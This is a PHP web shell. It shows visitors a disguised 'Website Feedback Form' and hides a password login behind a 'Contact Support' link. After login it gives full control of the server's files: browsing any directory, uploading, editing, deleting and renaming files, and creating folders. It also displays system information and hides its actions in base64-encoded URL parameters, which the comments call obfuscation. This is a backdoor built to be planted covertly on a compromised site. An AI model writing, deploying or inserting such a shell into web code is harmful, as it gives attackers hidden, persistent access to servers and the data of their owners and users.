<?php
// Start session
session_start();

// Handle logout request
if (isset($_GET['logout'])) {
    unset($_SESSION['authenticated']);
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check if authenticated
if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    // Handle login request
    if (isset($_POST['password']) && $_POST['password'] === 'secretpassword') {
        $_SESSION['authenticated'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        // Display disguised feedback form page
        echo "<h2>Website Feedback Form</h2>";
        echo "<p>Please fill out the form below to send us your feedback.</p>";
        echo "<form method='POST' action=''>";
        echo "<input type='text' name='username' placeholder='Your Name' /><br>";
        echo "<input type='email' name='email' placeholder='Your Email' /><br>";
        echo "<textarea name='feedback' placeholder='Your Feedback'></textarea><br>";
        echo "<input type='submit' value='Submit' />";
        echo "</form>";
        echo "<p><a href='#' onclick='showLoginForm()'>Contact Support</a></p>";
        echo "<div id='login-form' style='display: none;'>";
        echo "<form method='POST' action=''>";
        echo "<input type='password' name='password' placeholder='Password' />";
        echo "<input type='submit' value='Login' />";
        echo "</form>";
        echo "</div>";
        echo "<script>";
        echo "function showLoginForm() {";
        echo "document.getElementById('login-form').style.display = 'block';";
        echo "}";
        echo "</script>";
        if (isset($_POST['password'])) {
            echo "<p style='color: red;'>Invalid password.</p>";
        }
        exit;
    }
}

// File management functionality (accessible only after authentication)

// Display random string for obfuscation
function randomFunction() {
    $randomString = bin2hex(random_bytes(96));
    return $randomString;
}

$randomString = randomFunction();
echo "<p style='color: green;'>Random String: $randomString</p>";

// Display system information
function systemCheck() {
    $info = php_uname();
    $phpVersion = phpversion();
    echo "<p style='color: green;'>System Info: $info | PHP Version: $phpVersion</p>";
}

systemCheck();

$special_chars = "%00%0A%09//#";

// Command encoding and decoding functions
function encodeCommand($command) {
    return base64_encode($command);
}

function decodeCommand($encoded) {
    return base64_decode($encoded);
}

// Display directory listing
function displayDirectory($path) {
    global $special_chars;
    $items = array_diff(scandir($path), ['.', '..']);
    echo "<h3 style='color: green;'>Current Directory: $path</h3><ul>";
    foreach ($items as $item) {
        $itemPath = realpath($path . DIRECTORY_SEPARATOR . $item);
        if (is_dir($itemPath)) {
            $navigateCommand = encodeCommand('navigate|' . $itemPath);
            echo "<li><a href='?data=$navigateCommand'>$item</a></li>";
        } else {
            $editCommand = encodeCommand('action|edit|' . $path . '|' . $item);
            $deleteCommand = encodeCommand('action|delete|' . $path . '|' . $item);
            $renameCommand = encodeCommand('action|rename|' . $path . '|' . $item);
            echo "<li>$item <a href='?data=$editCommand'>$special_chars Edit</a> | 
                          <a href='?data=$deleteCommand'>$special_chars Delete</a> | 
                          <a href='?data=$renameCommand'>$special_chars Rename</a></li>";
        }
    }
    echo "</ul>";
}

// Handle file upload
function handleFileUpload($path) {
    if (!empty($_FILES['file']['name'])) {
        $target = $path . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p style='color: green;'>File uploaded successfully!</p>";
        } else {
            echo "<p style='color: red;'>Failed to upload file.</p>";
        }
    }
}

// Create new folder
function createNewFolder($path) {
    if (!empty($_POST['folder_name'])) {
        $folderPath = $path . DIRECTORY_SEPARATOR . $_POST['folder_name'];
        if (!file_exists($folderPath)) {
            mkdir($folderPath);
            echo "<p style='color: green;'>Folder created: {$_POST['folder_name']}</p>";
        } else {
            echo "<p style='color: red;'>Folder already exists.</p>";
        }
    }
}

// Create new file
function createNewFile($path) {
    if (!empty($_POST['file_name'])) {
        $filePath = $path . DIRECTORY_SEPARATOR . $_POST['file_name'];
        if (!file_exists($filePath)) {
            file_put_contents($filePath, '');
            echo "<p style='color: green;'>File created: {$_POST['file_name']}</p>";
        } else {
            echo "<p style='color: red;'>File already exists.</p>";
        }
    }
}

// Display file edit form
function displayEditForm($filePath, $path) {
    $content = file_exists($filePath) ? htmlspecialchars(file_get_contents($filePath)) : '';
    echo "<form method='POST' action='?data=" . encodeCommand('action|edit|' . $path . '|' . basename($filePath)) . "'>
            <textarea name='content' style='width:100%; height:300px;'>$content</textarea><br>
            <button type='submit'>Save</button>
          </form>";
}

// Delete file
function deleteFile($filePath) {
    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo "<p style='color: green;'>File deleted successfully.</p>";
        } else {
            echo "<p style='color: red;'>Failed to delete file.</p>";
        }
    } else {
        echo "<p style='color: red;'>File does not exist.</p>";
    }
}

// Display rename form
function displayRenameForm($itemPath, $path) {
    echo "<form method='POST' action='?data=" . encodeCommand('action|rename|' . $path . '|' . basename($itemPath)) . "'>
            <input type='text' name='new_name' placeholder='New Name'>
            <button type='submit'>Rename</button>
          </form>";
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_GET['data'])) {
        $command = decodeCommand($_GET['data']);
        $parts = explode('|', $command, 4);
        if ($parts[0] == 'action' && $parts[1] == 'edit') {
            $path = $parts[2];
            $item = $parts[3];
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            if (isset($_POST['content'])) {
                file_put_contents($itemPath, $_POST['content']);
                echo "<p style='color: green;'>File updated successfully!</p>";
            }
        } elseif ($parts[0] == 'action' && $parts[1] == 'rename') {
            $path = $parts[2];
            $item = $parts[3];
            $itemPath = $path . DIRECTORY_SEPARATOR . $item;
            if (isset($_POST['new_name'])) {
                $newPath = $path . DIRECTORY_SEPARATOR . $_POST['new_name'];
                if (rename($itemPath, $newPath)) {
                    echo "<p style='color: green;'>Item renamed successfully.</p>";
                } else {
                    echo "<p style='color: red;'>Failed to rename item.</p>";
                }
            }
        } elseif ($parts[0] == 'navigate') {
            $path = $parts[1];
            if (isset($_FILES['file'])) {
                handleFileUpload($path);
            } elseif (isset($_POST['folder_name'])) {
                createNewFolder($path);
            } elseif (isset($_POST['file_name'])) {
                createNewFile($path);
            }
        }
        $navigateCommand = encodeCommand('navigate|' . $path);
        header("Location: ?data=$navigateCommand");
        exit;
    }
}

// Handle GET requests
if (isset($_GET['data'])) {
    $command = decodeCommand($_GET['data']);
    $parts = explode('|', $command, 4);
    if ($parts[0] == 'navigate') {
        $path = $parts[1];
        $parentPath = dirname($path);
        $goUpCommand = encodeCommand('navigate|' . $parentPath);
        echo "<a href='?data=$goUpCommand'>$special_chars Go Up</a>";
        displayDirectory($path);
        echo "<h3 style='color: green;'>Upload File</h3>
              <form method='POST' enctype='multipart/form-data' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='file' name='file'><button type='submit'>$special_chars Upload</button>
              </form>";
        echo "<h3 style='color: green;'>Create Folder</h3>
              <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='text' name='folder_name' placeholder='Folder Name'><button type='submit'>$special_chars Create</button>
              </form>";
        echo "<h3 style='color: green;'>Create File</h3>
              <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
                <input type='text' name='file_name' placeholder='File Name'><button type='submit'>$special_chars Create</button>
              </form>";
    } elseif ($parts[0] == 'action') {
        $action = $parts[1];
        $path = $parts[2];
        $item = $parts[3];
        $itemPath = $path . DIRECTORY_SEPARATOR . $item;
        if ($action == 'delete') {
            deleteFile($itemPath);
            $navigateCommand = encodeCommand('navigate|' . $path);
            header("Location: ?data=$navigateCommand");
            exit;
        } elseif ($action == 'edit') {
            displayEditForm($itemPath, $path);
        } elseif ($action == 'rename') {
            displayRenameForm($itemPath, $path);
        }
    }
} else {
    $path = getcwd();
    $parentPath = dirname($path);
    $goUpCommand = encodeCommand('navigate|' . $parentPath);
    echo "<a href='?data=$goUpCommand'>$special_chars Go Up</a>";
    displayDirectory($path);
    echo "<h3 style='color: green;'>Upload File</h3>
          <form method='POST' enctype='multipart/form-data' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='file' name='file'><button type='submit'>$special_chars Upload</button>
          </form>";
    echo "<h3 style='color: green;'>Create Folder</h3>
          <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='text' name='folder_name' placeholder='Folder Name'><button type='submit'>$special_chars Create</button>
          </form>";
    echo "<h3 style='color: green;'>Create File</h3>
          <form method='POST' action='?data=" . encodeCommand('navigate|' . $path) . "'>
            <input type='text' name='file_name' placeholder='File Name'><button type='submit'>$special_chars Create</button>
          </form>";
}

// Add logout link
echo "<br><a href='?logout=1'>Logout</a>";
?>